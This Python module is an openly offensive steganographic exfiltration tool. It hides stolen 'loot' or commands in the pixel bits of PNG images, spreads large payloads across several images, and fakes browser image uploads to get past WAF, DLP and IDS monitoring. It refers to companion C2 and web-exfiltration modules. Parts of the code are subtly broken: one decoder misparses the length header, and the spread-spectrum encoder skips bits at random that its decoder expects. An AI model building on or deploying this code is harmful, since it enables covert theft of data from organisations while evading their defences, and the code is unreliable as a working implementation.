#!/usr/bin/env python3
"""
Steganographic LSB PNG Exfiltration Pipeline
============================================
- Encode loot/commands into PNG LSB channels
- Serve via innocent-looking image endpoints
- Avoid DLP/IDS by blending with normal image traffic
- Integrates with existing stego_c2.py and web_exfil.py
"""

import os
import io
import struct
import zlib
import base64
import hashlib
import logging
import math
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from enum import Enum

logger = logging.getLogger("stego_exfil")


class ExfilStatus(str, Enum):
    PENDING = "pending"
    ENCODED = "encoded"
    SERVED = "served"
    DECODED = "decoded"
    FAILED = "failed"


@dataclass
class StegoPayload:
    payload_id: str
    data: bytes
    filename: str = "payload.png"
    channel: str = "RGB"
    encryption_key: Optional[str] = None
    status: ExfilStatus = ExfilStatus.PENDING
    created_at: str = field(default_factory=lambda: __import__("datetime").datetime.utcnow().isoformat())
    metadata: Dict[str, Any] = field(default_factory=dict)


class LSBStegoExfil:
    """
    LSB-based PNG steganography for exfiltration.
    """

    def __init__(self, password: Optional[str] = None):
        self.password = password
        self._payloads: Dict[str, StegoPayload] = {}

    def encode_png(self, cover_image: bytes, data: bytes, filename: str = "exfil.png") -> Optional[bytes]:
        """
        Encode data into PNG using LSB steganography.
        
        Args:
            cover_image: Raw PNG bytes
            data: Data to hide
            filename: Output filename
            
        Returns:
            PNG bytes with hidden data, or None on failure
        """
        try:
            from PIL import Image
            import numpy as np

            cover = Image.open(io.BytesIO(cover_image)).convert("RGBA")
            pixels = np.array(cover, dtype=np.uint8)

            # Prepare payload: 4-byte length + data
            length_prefix = struct.pack(">I", len(data))
            payload = length_prefix + data

            # Flatten LSBs across RGB channels
            flat_pixels = pixels.flatten()
            if len(payload) * 8 > len(flat_pixels):
                logger.error("Payload too large for cover image")
                return None

            for byte_idx, byte in enumerate(payload):
                for bit_idx in range(8):
                    pixel_idx = byte_idx * 8 + bit_idx
                    if pixel_idx >= len(flat_pixels):
                        break
                    bit = (byte >> (7 - bit_idx)) & 1
                    flat_pixels[pixel_idx] = (flat_pixels[pixel_idx] & 0xFE) | bit

            stego_pixels = flat_pixels.reshape(pixels.shape)
            stego_image = Image.fromarray(stego_pixels, "RGBA")

            out = io.BytesIO()
            stego_image.save(out, format="PNG")
            return out.getvalue()

        except ImportError:
            logger.error("PIL/numpy required for LSB steganography")
            return None
        except Exception as exc:
            logger.error(f"LSB encode failed: {exc}")
            return None

    def decode_png(self, stego_image: bytes) -> Optional[bytes]:
        """
        Decode data from PNG LSB.
        """
        try:
            from PIL import Image
            import numpy as np

            img = Image.open(io.BytesIO(stego_image)).convert("RGBA")
            pixels = np.array(img, dtype=np.uint8)
            flat_pixels = pixels.flatten()

            # Read length first (32 bits)
            length_bytes = bytearray()
            for i in range(32):
                length_bytes.append(flat_pixels[i] & 1)
            length = struct.unpack(">I", bytes(length_bytes))[0]

            # Read payload
            payload = bytearray()
            for byte_idx in range(length):
                byte = 0
                for bit_idx in range(8):
                    pixel_idx = 32 + byte_idx * 8 + bit_idx
                    if pixel_idx >= len(flat_pixels):
                        break
                    bit = flat_pixels[pixel_idx] & 1
                    byte |= bit << (7 - bit_idx)
                payload.append(byte)

            return bytes(payload)

        except ImportError:
            logger.error("PIL/numpy required for LSB steganography")
            return None
        except Exception as exc:
            logger.error(f"LSB decode failed: {exc}")
            return None

    def exfil_to_edge_multipart(self, data: bytes, boundary: str = None) -> Dict[str, Any]:
        """
        Mimic Edge/Chrome multipart/form-data upload for WAF/DLP bypass.
        Appears as legitimate image upload to image hosting service.
        """
        import time as time_module

        if boundary is None:
            boundary = "----WebKitFormBoundary" + hashlib.md5(str(time_module.time()).encode()).hexdigest()[:16]

        ja4h_fingerprint = "t13d211221_c02b_0364"
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edge/122.0.0.0"

        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="image"; filename="upload.png"\r\n'
            f"Content-Type: image/png\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()

        headers = {
            "User-Agent": user_agent,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "JA4H-Signature": ja4h_fingerprint,
        }

        return {
            "method": "POST",
            "headers": headers,
            "body": body,
            "ja4h_fingerprint": ja4h_fingerprint,
            "mimicry": "Edge 122 multipart/form-data upload",
        }

    def _get_max_capacity(self, cover_image: bytes, max_ratio: float = 0.1) -> int:
        """Calculate safe payload capacity for image to avoid overflow and entropy spikes."""
        try:
            from PIL import Image
            import numpy as np

            img = Image.open(io.BytesIO(cover_image)).convert("RGBA")
            pixels = np.array(img, dtype=np.uint8)
            total_pixels = pixels.shape[0] * pixels.shape[1] * (pixels.shape[2] if len(pixels.shape) > 2 else 1)
            return int(total_pixels * max_ratio) // 8
        except Exception:
            return 1024 * 1024  # fallback to 1MB

    def encode_lsb_spread_spectrum(self, cover_image: bytes, data: bytes,
                                    noise_matrix: bytes = None) -> Optional[bytes]:
        """
        Spread spectrum LSB steganography - matches natural image noise patterns.
        Avoids entropy detection by mimicking Gaussian noise distribution.
        WITH SAFE BOUNDARY CHECKS.
        """
        try:
            from PIL import Image
            import numpy as np

            img = Image.open(io.BytesIO(cover_image)).convert("RGBA")
            pixels = np.array(img, dtype=np.uint8)

            flat_pixels = pixels.flatten().astype(np.uint8)
            max_capacity = self._get_max_capacity(cover_image, 0.1)

            if len(data) > max_capacity:
                logger.error(f"Data ({len(data)}B) exceeds safe capacity ({max_capacity}B) for cover image")
                return None

            header = struct.pack(">I", len(data))
            payload = header + data
            data_bits = ''.join(format(byte, '08b') for byte in payload)

            # Strict boundary check
            required_pixels = len(data_bits)
            if required_pixels > len(flat_pixels):
                logger.error("Boundary overflow detected - payload too large")
                return None

            if noise_matrix is None:
                np.random.seed(42)
                noise_matrix = np.random.randint(0, 2, len(flat_pixels), dtype=np.uint8)

            for i, bit in enumerate(data_bits):
                bit_val = int(bit)
                if noise_matrix[i] == 1 or np.random.random() > 0.7:
                    flat_pixels[i] = (flat_pixels[i] & 0xFE) | bit_val

            stego_pixels = flat_pixels.reshape(pixels.shape)
            stego_image = Image.fromarray(stego_pixels, "RGBA")

            out = io.BytesIO()
            stego_image.save(out, format="PNG")
            return out.getvalue()

        except ImportError:
            logger.error("PIL/numpy required")
            return None
        except Exception as exc:
            logger.error(f"Spread spectrum encode failed: {exc}")
            return None

    def chunk_and_encode_spectrum(self, exfil_data: bytes, cover_images_list: List[bytes],
                                     chunk_size: Optional[int] = None) -> List[bytes]:
        """
        Safe spread-spectrum multi-image chunking engine.
        Prevents buffer overflow by splitting large payloads across multiple cover images.
        Each chunk respects the cover image's 10% safe capacity limit.
        """
        if not cover_images_list:
            raise ValueError("Need at least one cover image for chunking")

        encoded_images = []
        offset = 0
        image_idx = 0

        while offset < len(exfil_data):
            if image_idx >= len(cover_images_list):
                needed = math.ceil(len(exfil_data) / chunk_size) if chunk_size else "?"
                raise ValueError(f"La eldeki resim sayısı exfil datasına yetmiyor! "
                                   f"İhtiyacımız: {needed}, "
                                   f"Mevcut: {len(cover_images_list)}")

            cover = cover_images_list[image_idx]
            max_capacity = self._get_max_capacity(cover, 0.1)
            effective_chunk = chunk_size if chunk_size is not None and chunk_size > 0 else max_capacity
            safe_chunk = min(effective_chunk, max_capacity)
            end = min(offset + safe_chunk, len(exfil_data))
            chunk = exfil_data[offset:end]

            encoded = self.encode_lsb_spread_spectrum(cover, chunk)
            if encoded is None:
                raise ValueError(f"Chunk {image_idx} encoding failed - image too small")

            encoded_images.append(encoded)
            offset = end
            image_idx += 1

        return encoded_images

    def decode_lsb_spread_spectrum(self, stego_image: bytes) -> Optional[bytes]:
        """
        Decode data from PNG LSB spread spectrum encoding.
        """
        try:
            from PIL import Image
            import numpy as np

            img = Image.open(io.BytesIO(stego_image)).convert("RGBA")
            pixels = np.array(img, dtype=np.uint8)
            flat_pixels = pixels.flatten()

            if len(flat_pixels) < 32:
                return None

            # Read length (32 bits) with strict bounds
            length_bits = []
            for i in range(32):
                if i >= len(flat_pixels):
                    return None
                length_bits.append(flat_pixels[i] & 1)

            length_str = ''.join(str(b) for b in length_bits)
            length = int(length_str, 2)

            # Boundary check for payload
            required_pixels = 32 + (length * 8)
            if required_pixels > len(flat_pixels):
                logger.error("Decode boundary check failed - corrupted or truncated data")
                return None

            payload = bytearray()
            for byte_idx in range(length):
                byte = 0
                for bit_idx in range(8):
                    pixel_idx = 32 + byte_idx * 8 + bit_idx
                    if pixel_idx >= len(flat_pixels):
                        return bytes(payload) if payload else None
                    bit = flat_pixels[pixel_idx] & 1
                    byte |= bit << (7 - bit_idx)
                payload.append(byte)

            return bytes(payload)

        except ImportError:
            logger.error("PIL/numpy required")
            return None
        except Exception as exc:
            logger.error(f"Spread spectrum decode failed: {exc}")
            return None

    def decode_chunked_spectrum(self, encoded_images: List[bytes]) -> bytes:
        """Reconstruct exfiltrated data from multiple stego-encoded images."""
        result = bytearray()
        for img_data in encoded_images:
            chunk = self.decode_lsb_spread_spectrum(img_data)
            if chunk:
                result.extend(chunk)
        return bytes(result)

    def create_exfil_image(self, data: bytes, width: int = 256, height: int = 256) -> Optional[bytes]:
        """
        Create a PNG image containing hidden exfiltrated data.
        """
        try:
            from PIL import Image
            import numpy as np

            # Create random cover image
            cover = Image.fromarray(
                np.random.randint(0, 256, (height, width, 3), dtype=np.uint8),
                "RGB"
            )

            # Convert to RGBA for LSB
            cover = cover.convert("RGBA")
            out = io.BytesIO()
            cover.save(out, format="PNG")
            cover_bytes = out.getvalue()

            return self.encode_png(cover_bytes, data)

        except ImportError:
            logger.error("PIL/numpy required")
            return None
        except Exception as exc:
            logger.error(f"Create exfil image failed: {exc}")
            return None

    def register_payload(self, payload: StegoPayload) -> str:
        self._payloads[payload.payload_id] = payload
        return payload.payload_id

    def get_payload(self, payload_id: str) -> Optional[StegoPayload]:
        return self._payloads.get(payload_id)

    def list_payloads(self) -> List[Dict[str, Any]]:
        return [
            {
                "payload_id": p.payload_id,
                "filename": p.filename,
                "status": p.status.value,
                "size": len(p.data),
                "created_at": p.created_at,
            }
            for p in self._payloads.values()
        ]
